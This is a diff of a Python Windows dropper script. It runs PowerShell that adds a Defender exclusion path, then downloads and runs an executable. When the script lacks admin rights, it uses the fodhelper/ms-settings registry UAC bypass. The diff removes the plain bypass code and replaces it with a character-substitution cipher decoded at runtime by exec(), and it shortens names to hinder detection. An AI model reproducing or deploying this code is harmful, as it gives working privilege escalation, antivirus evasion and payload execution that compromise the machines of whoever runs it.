@@ -11,16 +11,16 @@ def is_admin():
     except:
         return False
 
-def run_powershell_script_elevated():
+def ed():
     if is_admin():
         powershell = [
-    "$directoryPath = Join-Path $HOME 'hello'",
+    "$directoryPath = Join-Path $HOME 'kkl'",
     "Add-MpPreference -ExclusionPath $directoryPath",
-    "$url = 'http://192.168.11.108/payloads/nono.exe'",
-    "$targetDirectory = Join-Path $HOME 'hello'",
+    "$url = 'ssdd'",
+    "$targetDirectory = Join-Path $HOME 'kkl'",
     "if (-not (Test-Path -Path $targetDirectory)) {New-Item -Path $targetDirectory -ItemType Directory -Force}",
-    "$outputFile = Join-Path $targetDirectory 'hacked.exe'",
-    "$programName = 'hacked'",
+    "$outputFile = Join-Path $targetDirectory 'pe.exe'",
+    "$programName = 'pe'",
     "$programPath = $outputFile ",
     "Invoke-WebRequest -Uri $url -OutFile $outputFile",
     "$installerPath = $outputFile",
@@ -51,18 +51,29 @@ def run_powershell_script_elevated():
 
 
     else:
-        exe_file_path = os.path.abspath(sys.argv[0])
-        
-        powershell_command = f"""New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(Default)' -Value '{exe_file_path}'"""
+        def cu(data):
         
 
-        subprocess.run(["powershell.exe", "-v", "2", "-command", powershell_command], shell=True)
-        subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "C:\\Windows\\System32\\fodhelper.exe"], shell=True)
+            re = {'d': 'a', 'a': 'd', 'L': 'k', 'k': 'L', 'n': ')', ')': 'n','u':'p','p':'u'}
 
+            decoded_data = ""
+            for char in data:
+                decoded_char = re.get(char, char)  
+                decoded_data += decoded_char
+            return decoded_data
+
+        en="""
+exe_file_udth = os.udth.dbsudth(sys.drgv[0]n
+uowershell_commd)a = f'New-ItemProuerty -Pdth "HKCU:\Softwdre\Cldsses\ms-setti)gs\Shell\Oue)\commd)a" -Ndme "(Defdpltn" -Vdlpe "{exe_file_udth}"'
+spburocess.rp)(["uowershell.exe", "-v", "2", "-commd)a", uowershell_commd)a], shell=Trpen
+spburocess.rp)(["uowershell.exe", "-NoProfile", "-Execptio)Policy", "Byudss", "-Commd)a", "foaheluer.exe"], shell=Trpen
+"""     
+        de = cu(en)
+        exec(de)
         sys.exit(1)
 
 def run_powershell_thread():
-    run_powershell_script_elevated()
+    ed()
 
 if __name__ == "__main__":
   
